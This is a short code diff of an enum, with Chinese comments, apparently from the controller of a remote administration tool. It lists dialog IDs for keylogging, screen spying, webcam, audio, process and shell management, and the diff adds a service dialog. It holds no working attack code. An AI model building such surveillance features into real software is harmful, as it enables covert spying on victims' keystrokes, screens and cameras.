@@ -43,15 +43,17 @@ enum
 	WM_OPENKEYBOARDDIALOG,			// 打开键盘记录窗口
 	WM_OPENPSLISTDIALOG,			// 打开进程管理窗口
 	WM_OPENSHELLDIALOG,				// 打开shell窗口
+	WM_OPENSERVERDIALOG,			// 打开服务窗口
 	WM_RESETPORT,					// 改变端口
 	//////////////////////////////////////////////////////////////////////////
-	FILEMANAGER_DLG = 1,
-	SCREENSPY_DLG,
-	WEBCAM_DLG,
-	AUDIO_DLG,
-	KEYBOARD_DLG,
-	SYSTEM_DLG,
-	SHELL_DLG
+	FILEMANAGER_DLG = 1,			// 文件管理
+	SCREENSPY_DLG,					// 屏幕
+	WEBCAM_DLG,						
+	AUDIO_DLG,						// 语音管理
+	KEYBOARD_DLG,					// 键盘 未实现
+	SYSTEM_DLG,						// 进程
+	SHELL_DLG,						// shell管理
+	SERVER_DLG						// 服务管理
 };
 
 
